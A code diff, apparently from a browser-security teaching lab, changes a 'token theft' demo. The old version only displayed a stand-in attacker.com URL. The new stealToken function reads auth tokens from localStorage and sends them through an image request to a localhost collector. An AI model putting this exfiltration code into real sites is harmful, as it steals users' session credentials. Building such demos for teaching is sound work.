@@ -225,18 +225,7 @@ document.getElementById(<span class="str">'renderZone'</span>).<span class="hi-r
       </div>
     </div>
 
-    <!-- Console Log -->
-    <div class="panel full-width" id="console">
-      <div class="panel-header">
-        <h3>📋 Simulated Console / Event Log</h3>
-        <span class="ph-badge badge-danger">No CSP Violations — Nothing Blocked</span>
-      </div>
-      <div class="panel-body">
-        <div class="console-box">
-          <div class="cb-title">Browser Console Output</div>
-          <div id="logContainer"></div>
-        </div>
-      </div>
+   
     </div>
 
   </div>
@@ -293,19 +282,27 @@ document.getElementById(<span class="str">'renderZone'</span>).<span class="hi-r
 
   /* ── Token Theft Simulation ── */
   function stealToken() {
-    const stolen = localStorage.getItem('auth_token');
-    const user = localStorage.getItem('auth_user');
-    document.getElementById('alertBody').innerHTML =
-      '<span style="color:#ff8fa3">✓ Victim:</span> ' + user + '<br>' +
-      '<span style="color:#ff8fa3">✓ Token (partial):</span> <span style="color:var(--warn)">' + stolen.substring(0,80) + '...</span><br><br>' +
-      '<span style="color:#5a5d72">Simulated exfiltration → </span>' +
-      '<span style="color:var(--accent)">https://attacker.com/steal?t=' + stolen.substring(0,20) + '...</span><br><br>' +
-      '<span style="color:#3d4060">In a real attack, this would be sent via fetch() or new Image().src</span>';
-    document.getElementById('alertBanner').style.display = 'block';
-    addLog('🚨 TOKEN STOLEN: auth_token exfiltrated from localStorage!', 'err');
-    addLog('Simulated → attacker.com/steal?t=' + stolen.substring(0,20) + '...', 'err');
-  }
-
+  // 🔒 Prevent infinite execution
+  if (window.__tokenAlreadyStolen) return;
+  window.__tokenAlreadyStolen = true;
+  const stolen = localStorage.getItem('auth_token');
+  const user = localStorage.getItem('auth_user') || 'student';
+  const exfilUrl =
+    "http://localhost:9000/steal" +
+    "?user=" + encodeURIComponent(user) +
+    "&token=" + encodeURIComponent(stolen);
+  const img = new Image();
+  img.src = exfilUrl;
+  // Keep popup
+  document.getElementById('alertBody').innerHTML =
+    '<span style="color:#ff8fa3">✓ User:</span> ' + user + '<br>' +
+    '<span style="color:#ff8fa3">✓ Token (partial):</span> <span style="color:var(--warn)">' +
+      stolen.substring(0,80) + '...</span><br><br>' +
+    '<span style="color:#5a5d72">Sent to → </span>' +
+    '<span style="color:var(--accent)">' + exfilUrl.substring(0,80) + '...</span>';
+  document.getElementById('alertBanner').style.display = 'block';
+  addLog('🚨 TOKEN STOLEN (once) — sent to attacker server!', 'err');
+}
   function logout() {
     localStorage.clear();
     window.location.href = 'login.html';
